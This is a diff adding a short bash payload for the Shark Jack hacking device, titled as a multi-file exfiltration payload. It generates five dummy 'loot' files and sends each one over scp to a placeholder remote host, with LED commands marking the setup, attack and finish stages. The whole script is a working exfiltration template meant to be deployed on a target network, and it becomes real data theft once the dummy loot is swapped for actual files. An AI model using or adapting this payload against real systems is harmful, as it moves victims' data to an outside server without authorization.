@@ -1,0 +1,28 @@
+#!/bin/bash
+
+# 
+# Title: Shark Bite - Multi-File Exfiltration Payload via SSH
+# Author: 810810810
+# Version: 1.0 
+# 
+# Description: This payload uses the power of the Shark Jack to exfiltrate 
+# multiple files to a remote server using the scp command over SSH.
+
+LOOT_DIR=/root/loot/shark_attack 
+REMOTE_USER=username
+REMOTE_HOST=your-computer.com
+REMOTE_DIR=/path/to/remote/directory
+
+LED SETUP 
+
+# Make 5 test loot files 
+mkdir -p $LOOT_DIR 
+for n in {1..5}; do dd if=/dev/zero of="$LOOT_DIR/file$n.txt" bs=1 count=1024; done 
+
+LED ATTACK 
+
+# Exfiltrate all test loot files 
+FILES="$LOOT_DIR/*.txt" 
+for f in $FILES; do scp $f $REMOTE_USER@$REMOTE_HOST:$REMOTE_DIR; done 
+
+LED FINISH
